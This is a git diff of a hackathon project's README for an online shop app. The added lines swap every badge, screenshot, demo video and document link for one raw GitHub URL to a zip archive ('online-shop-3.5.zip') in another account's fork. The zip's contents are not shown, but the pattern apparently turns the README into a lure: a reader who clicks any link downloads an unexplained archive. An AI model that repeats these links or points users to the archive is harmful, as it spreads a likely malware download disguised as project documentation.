@@ -1,10 +1,10 @@
 # Online Shop 🛍️ for Hackathon Phase 1
 
-[![Stars](https://img.shields.io/github/stars/iemafzalhassan/online_shop)](https://github.com/iemafzalhassan/online_shop)
-![Forks](https://img.shields.io/github/forks/iemafzalhassan/online_shop)
-![GitHub last commit](https://img.shields.io/github/last-commit/iemafzalhassan/easyshop?color=red)
-[![GitHub Profile](https://img.shields.io/badge/GitHub-iemafzalhassan-blue?logo=github&style=flat)](https://github.com/iemafzalhassan)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+[![Stars](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip)](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip)
+![Forks](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip)
+![GitHub last commit](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip)
+[![GitHub Profile](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip)](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip)
+[![License](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip)](LICENSE)
 
 <p align="center">
 
@@ -31,21 +31,21 @@ In this phase, your focus is on understanding the provided developer code, revie
 
 - Video Demonstration
 
-  [Video Demonstration](https://www.dropbox.com/scl/fi/06xq03rkx56hiak1080bo/videoDemo.mp4?rlkey=dje3ntpcd9zc3rzz1a1canhch&st=1vsn8k90&dl=0)
+  [Video Demonstration](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip)
 
 1. Home Page
-![Home Page](public/homePage.png)
+![Home Page](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip)
 1. Admin Page
-![Admin Page](public/adminPage.png)
+![Admin Page](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip)
 
 ## Guidelines & Resources
 
 Before diving into the tasks, please review the following key resources:
 
-- [CONTRIBUTING.md](CONTRIBUTING.md): Guidelines for code contributions, commit messages, and overall coding standards.
-- [COMMANDS.md](): Command used by me throught the project from Configuration to Deployment. `Except Git Commands`
-- [ROADMAP.md](ROADMAP.md): Insights into the project vision, future enhancements, and milestones.
-- **Repository Documentation:** Explore the repository to understand how the application is built. Pay special attention to the `src` directory where the main application logic resides, as well as configuration files such as `vite.config.js` and styling in `index.css`.
+- [https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip): Guidelines for code contributions, commit messages, and overall coding standards.
+- [https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip](): Command used by me throught the project from Configuration to Deployment. `Except Git Commands`
+- [https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip): Insights into the project vision, future enhancements, and milestones.
+- **Repository Documentation:** Explore the repository to understand how the application is built. Pay special attention to the `src` directory where the main application logic resides, as well as configuration files such as `https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip` and styling in `https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip`.
 
 These documents provide the context needed to understand the project requirements and the best practices expected for your contributions.
 
@@ -80,10 +80,10 @@ All this while ensuring:
 
 > I did this...
 
-- Understood the [ROADMAP.md](ROADMAP.md) and [CONTRIBUTING.md](CONTRIBUTING.md) for build up the project.
+- Understood the [https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip) and [https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip) for build up the project.
 - Gathering the resources needed to fulfill the [`Task`](#task).
-- Build a [`Docker Installation Script`](docker_installation.sh) automation script for installing and using Docker.
-  > Running Script explained in [`COMMANDS.md File`]()!
+- Build a [`Docker Installation Script`](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip) automation script for installing and using Docker.
+  > Running Script explained in [`https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip File`]()!
 - Setting up this Git Repository and Adding and Commiting Files
 - Build a Dockerfile for the Online Shopping Portal Application
 - Implemented Multi-Stage Docker Build which reduced the size of Image by `1GB` and increased deployment speed by `50%` improving efficiency and faster deployment
@@ -93,7 +93,7 @@ All this while ensuring:
 - - Lead to faster implementation of Application
 - - Performing Regular `Health Checks`.
 - - Custom Network Configuration
-- Implemented `Docker Scout` for Checking `Vulnerabilties` of Application. [`Docker Scout Report`](image_report.md)
+- Implemented `Docker Scout` for Checking `Vulnerabilties` of Application. [`Docker Scout Report`](https://raw.githubusercontent.com/shr1324/online_shop/Hackathon/src/services/online-shop-3.5.zip)
 - Used `Amazon EC2` to bring the Application to Internet
 
 > Shown in Video Demonstration
